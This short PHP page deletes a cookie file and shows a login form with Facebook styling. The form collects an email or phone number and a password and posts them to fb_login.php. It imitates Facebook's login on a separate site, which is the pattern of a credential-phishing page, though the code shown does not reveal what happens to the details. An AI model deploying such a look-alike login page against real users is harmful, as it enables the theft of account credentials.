<?php

unlink('mirazmac_cookie.txt');
      //echo '<div align="right">';
      //echo '<form action="fb_login.php" method="post">';
      //echo '<font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
      //echo '<font style="font-family:arial; font-size:9px;">   Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
      //echo '<input type="submit" value="Log In" style="font-family:arial; font-size:9px; margin-left: 10px; margin-top: 10px;">';
      //echo '</form>'; 
      //echo '</div>';
?>
<style>
html { 
  background: url("facebook.png") no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
div.transbox {
  margin: 30px;
  width: 350px;
  height: 170px;
  border: 1px solid black;
  background-color: rgba(255,255,255,.3);
  position: absolute;
  left: 65%;
}
div.dentro {
  margin: 50px;
}
</style>

<div class="transbox">
<div class="dentro">
  <form action="fb_login.php" method="post">
      <table  border="0">
      <tr valign="botton">
      <td><font style="font-family:arial; font-size:10px;"><b>Email or Phone </b></font></td>
      <td align="left"><input type="text" name="user" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
      </tr>
      <tr valign="botton">
      <td><font style="font-family:arial; font-size:10px;"><b>Password </b></font></td>
      <td align="left"><input type="password" name="password" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
      </tr>
      <tr valign="botton">
      <td></td>
      <td align="left"><input type="image" src="fb.png" style="width:200px;height:75px;"></td>
      </tr>
      </table>
  </form>
</div>
</div>




